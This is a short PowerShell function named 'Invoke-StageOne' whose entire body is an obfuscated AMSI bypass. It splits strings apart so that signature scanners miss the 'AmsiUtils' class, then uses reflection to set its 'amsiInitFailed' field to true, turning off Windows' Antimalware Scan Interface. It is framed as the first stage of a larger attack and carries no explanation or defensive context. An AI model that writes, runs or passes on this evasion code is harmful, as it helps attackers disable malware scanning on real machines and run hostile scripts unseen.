function Invoke-StageOne {
    # Code for Stage One goes here
   
$w='Sy'+'stem.'+'Ma'+'na'+'ge'+'ment.A'+'u';$c='si';$m='Uti'+'ls';$ass=[Ref].Assembly.GetType(('{'+'0}m{1}{2}'-f$w,$c,$m));$f=$ass.GetField(('am{0}InitFai'+'led'-f$c),'Non'+'Public,S'+'tati'+'c');$f.SetValue($null,$true)

    # If Stage One completes successfully, write a success message
    Write-Host "Stage One succeeded" -ForegroundColor Green
}
